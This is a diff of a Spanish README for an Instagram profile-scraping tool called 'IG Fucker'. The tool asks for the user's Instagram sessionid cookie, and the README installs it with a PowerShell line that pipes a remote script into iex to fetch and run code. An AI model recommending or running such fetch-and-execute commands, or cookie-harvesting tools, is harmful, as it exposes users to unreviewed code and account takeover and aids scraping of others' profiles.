@@ -1,34 +1,26 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/4drixn/IG-Fucker/main/assets/icon.ico" width="80" alt="Logo">
-  <h1>IG Fucker</h1>
-  <p>Herramienta premium y optimizada para extracción de perfiles de Instagram.</p>
-</div>
+# IG Fucker
 
-## ✨ Características
-- **Extracción Completa:** Descarga imágenes y metadatos de posts rápidamente.
-- **Ultra-Optimizado:** Cliente ligero escrito en Node/Electron con tiempos de carga instantáneos.
-- **Interfaz Premium:** Diseño moderno (bento-box) sin lag, claro y profesional.
-- **Sin Dependencias:** Descarga un solo ejecutable y listo.
+<p align="left">
+  <img src="https://img.shields.io/badge/version-2.0.0-blue?style=flat-square" alt="Version">
+  <img src="https://img.shields.io/badge/platform-Windows-lightgrey?style=flat-square" alt="Platform">
+</p>
 
-## 🚀 Instalación Rápida (Recomendado)
-Abre **PowerShell** en tu computadora (no hace falta ser administrador) y pega el siguiente comando:
+Herramienta de extraccion de perfiles para Instagram. Permite descargar imagenes y metadatos (textos) de cualquier perfil publico o accesible mediante SessionID.
+
+## Funcionalidad
+
+- **Extraccion de medios**: Descarga las publicaciones de un perfil directamente a una carpeta local.
+- **Soporte de cuentas privadas**: Permite el uso de `sessionid` para acceder a perfiles si tienes permisos en tu cuenta de Instagram.
+- **Sin dependencias**: Se distribuye como un ejecutable `.exe` independiente.
+
+## Instalacion y Uso
+
+Abre PowerShell y ejecuta el siguiente comando para descargar el ejecutable en tu Escritorio:
 
 ```powershell
 iwr -useb https://raw.githubusercontent.com/4drixn/IG-Fucker/main/install.ps1 | iex
 ```
-*(Esto descargará automáticamente la última versión del `.exe` a tu Escritorio y estará listo para usar).*
 
-## 📖 Instrucciones de Uso
-1. Abre `IGFucker.exe` en tu escritorio.
-2. Ingresa el **Username** o la **URL** del perfil.
-3. *(Opcional)* Si la cuenta exige inicio de sesión o tiene restricciones, ingresa tu `sessionid` (cookie de Instagram).
-4. Selecciona la carpeta donde quieres guardar todo el contenido.
-5. Haz clic en **Iniciar Extracción** y mira la consola en tiempo real.
-
-## ⚠️ Descargo de Responsabilidad
-Esta herramienta está creada con propósitos estrictamente educativos y de investigación. El creador (@92tif / @4drixn) no se hace responsable del mal uso de la misma ni de los bloqueos que Instagram pueda aplicar a las cuentas utilizadas.
-
----
-<div align="center">
-  <b>Developed by @92tif</b> | <a href="https://github.com/4drixn">GitHub</a>
-</div>
+1. Ejecuta `IGFucker.exe` desde tu Escritorio.
+2. Introduce la URL o username del perfil objetivo.
+3. Especifica tu carpeta de destino y presiona Iniciar.
